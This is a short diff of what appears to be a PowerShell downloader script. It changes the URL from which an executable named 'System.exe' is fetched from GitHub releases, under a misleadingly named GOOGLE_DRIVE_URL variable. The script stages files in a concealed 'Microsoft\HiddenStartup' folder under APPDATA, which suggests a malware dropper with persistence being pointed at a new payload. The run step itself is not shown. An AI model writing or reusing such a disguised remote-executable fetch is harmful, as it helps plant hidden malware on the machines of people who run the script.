@@ -1,4 +1,4 @@
-$GOOGLE_DRIVE_URL = "https://github.com/kevinsocute/-temp-exe-Code-editing-by-me/releases/download/template/System.exe"
+$GOOGLE_DRIVE_URL = "https://github.com/kevinsocute2/exetemp/releases/download/powershell/System.exe"
 $TEMP_DIR = "$env:APPDATA\Microsoft\HiddenStartup\MyScriptTemp2"
 
 # Create the temporary directory if it doesn't exist
